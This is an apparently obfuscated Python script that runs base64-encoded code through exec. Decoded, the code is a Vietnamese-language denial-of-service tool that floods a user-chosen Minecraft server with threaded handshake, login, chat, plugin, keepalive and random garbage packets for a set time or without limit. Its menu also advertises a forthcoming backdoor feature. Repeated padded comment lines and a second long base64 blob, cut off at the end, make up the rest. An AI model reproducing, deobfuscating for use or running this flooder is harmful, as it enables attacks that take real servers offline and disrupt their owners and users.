ICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgyMSwgZW5jb2RlX3ZhcmludChyYW5kb20ucmFuZGludCgxMDAwMCwgOTk5OTk5KSkpCiAgICAgICAgZWxpZiBwa3RfdHlwZSA9PSAiY3VzdG9tIjoKICAgICAgICAgICAgZ2FyYmFnZSA9IGJ5dGVzKHJhbmRvbS5nZXRyYW5kYml0cyg4KSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMzApKSkKICAgICAgICAgICAgZmFrZV9pZCA9IHJhbmRvbS5yYW5kaW50KDB4MDEsIDB4M0YpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgZmFrZV9pZCwgZ2FyYmFnZSkKCmRlZiBzdGFydF9hdHRhY2soaXAsIHBvcnQsIHBhY2tldHNfcGVyX3JvdW5kLCBkdXJhdGlvbik6CiAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgIHBhY2tldF9pZCA9IDEKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHNfcGVyX3JvdW5kKToKICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1NaXhlZFBhY2tldEZsb29kZXIoaXAsIHBvcnQsIHBhY2tldF9pZCkucnVuKQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgcGFja2V0X2lkICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDIpCgogICAgICAgICAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdC5qb2luKCkKCiAgICAgICAgICAgIGlmIGR1cmF0aW9uICE9IDAgYW5kIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA+PSBkdXJhdGlvbjoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoZiJcbntDb2xvcnMuV0FSTklOR33Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gROG7q25nIGLhu59pIG5nxrDhu51pIGTDuW5nLntDb2xvcnMuRU5EQ30iKQogICAgZmluYWxseToKICAgICAgICBwcmludChmIlxue0NvbG9ycy5IRUFERVJ9yp/htIDhtIThtI3htIDJqsqA4bSA4bSYIOG0m+G0j+G0j8qfIFThuqROIEPDlE5HIEvhur5UIFRIw5pDe0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59VGjDoG5oIGPDtG5nOiB7c3VjY2Vzc19jb3VudH17Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1UaOG6pXQgYuG6oWk6IHtmYWlsX2NvdW50fXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfVThu5VuZyB0aOG7nWkgZ2lhbjoge2ludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpfSBnacOieXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHdhaXRfZm9yX3JldHVybigpCgpkZWYgd2FpdF9mb3JfcmV0dXJuKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlucCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfXtJY29ucy5BUlJPV30gTmjhuq1wIDAgxJHhu4MgcXVheSBs4bqhaSBtZW51OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgIGlmIGlucCA9PSAiMCI6CiAgICAgICAgICAgIGJyZWFrCgpkZWYgY2hlY2tfc2VydmVyKGlwLCBwb3J0KToKICAgIHRyeToKICAgICAgICB0ZXN0X3NvY2sgPSBzb2NrZXQuc29ja2V0KCkKICAgICAgICB0ZXN0X3NvY2suc2V0dGltZW91dCgzKQogICAgICAgIHRlc3Rfc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgdGVzdF9zb2NrLmNsb3NlKCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNob3dfbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0JMVUV9e0ljb25zLlNUQVIqM30gSMOjeSBHaGkgc+G7kSDEkeG7gyBzw6BpIMqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyB7SWNvbnMuU1RBUiozfXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59e0ljb25zLkNIRUNLfSAxLiBIaeG7h24gU3RhdHVze0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiIgICB7Q29sb3JzLklORk99SGnhu4duIHRow7RuZyB0aW4sIGNo4bupYyBuxINuZyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfXtJY29ucy5DSEVDS0JPWH0gMi4gSGnhu4duIFRvb2xzIMSRYW5nIHPDoGl7Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIiAgIHtDb2xvcnMuSU5GT31IxrDhu5tuZyBk4bqrbiBjw6FjaCBz4butIGThu6VuZyB0b29sIGRvcyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5XQVJOSU5HfXtJY29ucy5XQVJOSU5HfSAzLiBIaeG7h24gVG9vbHMgQmFja2Rvb3IgKENvbWluZyBzb29uKXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfVTDrW5oIG7Eg25nIEJhY2tkb29yIGhp4buHbiBjaMawYSBraOG6oyBk4bulbmcsIHPhur0gY+G6rXAgbmjhuq10IHNhdXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkZBSUx9e0ljb25zLkNST1NTfSA0LiBU4bqlbiBDw7RuZyBJcHtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfUto4bufaSDEkeG7mW5nIGNo4bupYyBuxINuZyB04bqlbiBjw7RuZyBn4butaSBwYWNrZXQgxJHhur9uIElQIHNlcnZlciDEkcOjIG5o4bqtcHtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkhFQURFUn17SWNvbnMuTkVYVH0gMC4gVGhvw6F0e0NvbG9ycy5FTkRDfVxuIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiJ7Q29sb3JzLkJPTER9e0ljb25zLkFSUk9XfSBDaOG7jW46IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBsw6AgY8O0bmcgY+G7pSBn4butaSBwYWNrZXQgaOG7l24gaOG7o3AgTWluZWNyYWZ0IMSR4buDIGtp4buDbSB0cmEga2jhuqMgbsSDbmcgY2jhu4t1IHThuqNpIHNlcnZlci57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLklORk99SOG7lyB0cuG7oyBuaGnhu4F1IGxv4bqhaSBwYWNrZXQgbmjGsCBjaGF0LCBwbHVnaW4sIGtlZXBhbGl2ZSwgY3VzdG9tLCB2LnYue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tHUkVFTn1Ub29scyDEkWFuZyBzw6BpOntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBoYW5kc2hha2UiKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBsb2dpbiBzdGFydCIpCiAgICAgICAgICAgIHByaW50KGYiIC0gR+G7rWkgcGFja2V0IGNoYXQsIHBsdWdpbiwga2VlcGFsaXZlLCBjdXN0b20gbmfhuqt1IG5oacOqbiIpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfULhuqFuIGPDsyB0aOG7gyB0w7l5IGNo4buNbiBz4buRIGzGsOG7o25nIHBhY2tldCBn4butaSB2w6AgdGjhu51pIGdpYW4gdOG6pW4gY8O0bmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuV0FSTklOR31Uw61uaCBuxINuZyBCYWNrZG9vciDEkWFuZyB0cm9uZyBxdcOhIHRyw6xuaCBwaMOhdCB0cmnhu4NuIHbDoCBjaMawYSBraOG6oyBk4bulbmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBpcCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBJUCBzZXJ2ZXIgTWluZWNyYWZ0OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwb3J0X3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBQb3J0ICht4bq3YyDEkeG7i25oIDI1NTY1KToge0NvbG9ycy5FTkRDfSIpLnN0cmlwKCkKICAgICAgICAgICAgcG9ydCA9IGludChwb3J0X3N0cikgaWYgcG9ydF9zdHIuaXNkaWdpdCgpIGVsc2UgMjU1NjUKICAgICAgICAgICAgaWYgbm90IGNoZWNrX3NlcnZlcihpcCwgcG9ydCk6CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1LaMO0bmcgdGjhu4Mga+G6v3QgbuG7kWkgdOG7m2kgc2VydmVyIHtpcH06e3BvcnR9LiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBJUCBob+G6t2MgUG9ydC57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBwYWNrZXRzX3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfVPhu5EgbMaw4bujbmcgcGFja2V0IGfhu61pIG3hu5dpIGzhuqduICh2ZDogMTApOiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwYWNrZXRzID0gaW50KHBhY2tldHNfc3RyKSBpZiBwYWNrZXRzX3N0ci5pc2RpZ2l0KCkgZWxzZSAxMAogICAgICAgICAgICBkdXJhdGlvbl9zdHIgPSBpbnB1dChmIntDb2xvcnMuQk9MRH1UaOG7nWkgZ2lhbiB04bqlbiBjw7RuZyAoZ2nDonksIG5o4bqtcCAwIMSR4buDIHbDtCBo4bqhbik6IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCiAgICAgICAgICAgIGR1cmF0aW9uID0gaW50KGR1cmF0aW9uX3N0cikgaWYgZHVyYXRpb25fc3RyLmlzZGlnaXQoKSBlbHNlIDAKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLldBUk5JTkd9QuG6r3QgxJHhuqd1IHThuqVuIGPDtG5nIElQIHtpcH06e3BvcnR9Li4ue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHN0YXJ0X2F0dGFjayhpcCwgcG9ydCwgcGFja2V0cywgZHVyYXRpb24pCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tCTFVFfVRob8OhdCBjaMawxqFuZyB0csOsbmguIEjhurluIGfhurdwIGzhuqFpIXtDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfUzhu7FhIGNo4buNbiBraMO0bmcgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIHRo4butIGzhuqFpLntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc2hvd19tZW51KCkK').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('CmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpjbGFzcyBDb2xvcnM6CiAgICBIRUFERVIgPSAnXDAzM1s5NW0nCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nCiAgICBPS0dSRUVOID0gJ1wwMzNbOTJtJwogICAgV0FSTklORyA9ICdcMDMzWzkzbScKICAgIEZBSUwgPSAnXDAzM1s5MW0nCiAgICBJTkZPID0gJ1wwMzNbOTZtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgQk9MRCA9ICdcMDMzWzFtJwoKY2xhc3MgSWNvbnM6CiAgICBBUlJPVyA9ICfilronCiAgICBDSEVDSyA9ICfinJQnCiAgICBDUk9TUyA9ICfinJgnCiAgICBTVEFSID0gJ+KYhScKICAgIFdBUk5JTkcgPSAn4pigJwogICAgSU5GTyA9ICfinIknCiAgICBORVhUID0gJ+KepCcKICAgIENIRUNLQk9YID0gJ+KYkScKICAgIEJVTExFVCA9ICfinKYnCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCnN1Y2Nlc3NfY291bnQgPSAwCmZhaWxfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgpkZWYgZW5jb2RlX3ZhcmludCh2YWx1ZSk6CiAgICByZXN1bHQgPSBiJycKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGVtcCA9IHZhbHVlICYgMHg3RgogICAgICAgIHZhbHVlID4+PSA3CiAgICAgICAgaWYgdmFsdWU6CiAgICAgICAgICAgIHRlbXAgfD0gMHg4MAogICAgICAgIHJlc3VsdCArPSBieXRlcyhbdGVtcF0pCiAgICAgICAgaWYgbm90IHZhbHVlOgogICAgICAgICAgICBicmVhawogICAgcmV0dXJuIHJlc3VsdAoKZGVmIGVuY29kZV9zdHJpbmcocyk6CiAgICBkYXRhID0gcy5lbmNvZGUoJ3V0Zi04JykKICAgIHJldHVybiBlbmNvZGVfdmFyaW50KGxlbihkYXRhKSkgKyBkYXRhCgpkZWYgc2VuZF9wYWNrZXQoc29jaywgcGFja2V0X2lkLCBkYXRhKToKICAgIHBhY2tldCA9IGJ5dGVzKFtwYWNrZXRfaWRdKSArIGRhdGEKICAgIGxlbmd0aCA9IGVuY29kZV92YXJpbnQobGVuKHBhY2tldCkpCiAgICBzb2NrLnNlbmRhbGwobGVuZ3RoICsgcGFja2V0KQoKZGVmIGdlbmVyYXRlX3VzZXJuYW1lKCk6CiAgICByZXR1cm4gIlVzZXJfIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMsIGs9OCkpCgpkZWYgcmFuZG9tX2NoYXQoKToKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz1yYW5kb20ucmFuZGludCg1LCAyMCkpKQoKY2xhc3MgTWl4ZWRQYWNrZXRGbG9vZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBwYWNrZXRfaWQpOgogICAgICAgIHNlbGYuaXAgPSBpcAogICAgICAgIHNlbGYucG9ydCA9IHBvcnQKICAgICAgICBzZWxmLnBhY2tldF9pZCA9IHBhY2tldF9pZAogICAgICAgIHNlbGYuc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCiAgICBkZWYgY29ubmVjdChzZWxmKToKICAgICAgICBzZWxmLnNvY2suc2V0dGltZW91dCgzKQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChzZWxmLmlwLCBzZWxmLnBvcnQpKQoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZ2xvYmFsIHN1Y2Nlc3NfY291bnQsIGZhaWxfY291bnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH3Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gU0VSVkVSIE3huqRUIEvhur5UIE7hu5BJICggQ0jhur5UICl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBmYWlsX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgaGFuZHNoYWtlID0gKAogICAgICAgICAgICAgICAgZW5jb2RlX3ZhcmludCg3NTQpICsKICAgICAgICAgICAgICAgIGVuY29kZV9zdHJpbmcoc2VsZi5pcCkgKwogICAgICAgICAgICAgICAgc2VsZi5wb3J0LnRvX2J5dGVzKDIsICdiaWcnKSArCiAgICAgICAgICAgICAgICBlbmNvZGVfdmFyaW50KDIpICAjIE5leHQgc3RhdGUgPSBsb2dpbgogICAgICAgICAgICApCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgaGFuZHNoYWtlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDIpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgZW5jb2RlX3N0cmluZyhnZW5lcmF0ZV91c2VybmFtZSgpKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjA1KQoKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMiwgNikpOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3JhbmRvbV9wYWNrZXQoKQoKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaMOgbmggQ8O0bmcgIXtDb2xvcnMuRU5EQ30iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaOG6pXQgQuG6oWl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgZmFpbF9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgc2VsZi5zb2NrLmNsb3NlKCkKCiAgICBkZWYgc2VuZF9yYW5kb21fcGFja2V0KHNlbGYpOgogICAgICAgIHBrdF90eXBlID0gcmFuZG9tLmNob2ljZShbImNoYXQiLCAicGx1Z2luIiwgImtlZXBhbGl2ZSIsICJjdXN0b20iXSkKCiAgICAgICAgaWYgcGt0X3R5cGUgPT0gImNoYXQiOgogICAgICAgICAgICBtc2cgPSBlbmNvZGVfc3RyaW5nKHJhbmRvbV9jaGF0KCkpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMywgbXNnKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gInBsdWdpbiI6CiAgICAgICAgICAgIGNoYW5uZWwgPSBlbmNvZGVfc3RyaW5nKCJNQ3xCcmFuZCIpCiAgICAgICAgICAgIGRhdGEgPSBlbmNvZGVfc3RyaW5nKCJMQUMxM19DdXN0b21DbGllbnQiKQogICAgICAgICAgICBzZW5kX3BhY2tldChzZWxmLnNvY2ssIDB4MTcsIGNoYW5uZWwgKyBkYXRhKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gImtlZXBhbGl2ZSI6CiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgyMSwgZW5jb2RlX3ZhcmludChyYW5kb20ucmFuZGludCgxMDAwMCwgOTk5OTk5KSkpCiAgICAgICAgZWxpZiBwa3RfdHlwZSA9PSAiY3VzdG9tIjoKICAgICAgICAgICAgZ2FyYmFnZSA9IGJ5dGVzKHJhbmRvbS5nZXRyYW5kYml0cyg4KSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMzApKSkKICAgICAgICAgICAgZmFrZV9pZCA9IHJhbmRvbS5yYW5kaW50KDB4MDEsIDB4M0YpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgZmFrZV9pZCwgZ2FyYmFnZSkKCmRlZiBzdGFydF9hdHRhY2soaXAsIHBvcnQsIHBhY2tldHNfcGVyX3JvdW5kLCBkdXJhdGlvbik6CiAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgIHBhY2tldF9pZCA9IDEKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHNfcGVyX3JvdW5kKToKICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1NaXhlZFBhY2tldEZsb29kZXIoaXAsIHBvcnQsIHBhY2tldF9pZCkucnVuKQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgcGFja2V0X2lkICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDIpCgogICAgICAgICAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdC5qb2luKCkKCiAgICAgICAgICAgIGlmIGR1cmF0aW9uICE9IDAgYW5kIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA+PSBkdXJhdGlvbjoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoZiJcbntDb2xvcnMuV0FSTklOR33Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gROG7q25nIGLhu59pIG5nxrDhu51pIGTDuW5nLntDb2xvcnMuRU5EQ30iKQogICAgZmluYWxseToKICAgICAgICBwcmludChmIlxue0NvbG9ycy5IRUFERVJ9yp/htIDhtIThtI3htIDJqsqA4bSA4bSYIOG0m+G0j+G0j8qfIFThuqROIEPDlE5HIEvhur5UIFRIw5pDe0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59VGjDoG5oIGPDtG5nOiB7c3VjY2Vzc19jb3VudH17Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1UaOG6pXQgYuG6oWk6IHtmYWlsX2NvdW50fXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfVThu5VuZyB0aOG7nWkgZ2lhbjoge2ludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpfSBnacOieXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHdhaXRfZm9yX3JldHVybigpCgpkZWYgd2FpdF9mb3JfcmV0dXJuKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlucCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfXtJY29ucy5BUlJPV30gTmjhuq1wIDAgxJHhu4MgcXVheSBs4bqhaSBtZW51OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgIGlmIGlucCA9PSAiMCI6CiAgICAgICAgICAgIGJyZWFrCgpkZWYgY2hlY2tfc2VydmVyKGlwLCBwb3J0KToKICAgIHRyeToKICAgICAgICB0ZXN0X3NvY2sgPSBzb2NrZXQuc29ja2V0KCkKICAgICAgICB0ZXN0X3NvY2suc2V0dGltZW91dCgzKQogICAgICAgIHRlc3Rfc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgdGVzdF9zb2NrLmNsb3NlKCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNob3dfbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0JMVUV9e0ljb25zLlNUQVIqM30gSMOjeSBHaGkgc+G7kSDEkeG7gyBzw6BpIMqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyB7SWNvbnMuU1RBUiozfXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59e0ljb25zLkNIRUNLfSAxLiBIaeG7h24gU3RhdHVze0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiIgICB7Q29sb3JzLklORk99SGnhu4duIHRow7RuZyB0aW4sIGNo4bupYyBuxINuZyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9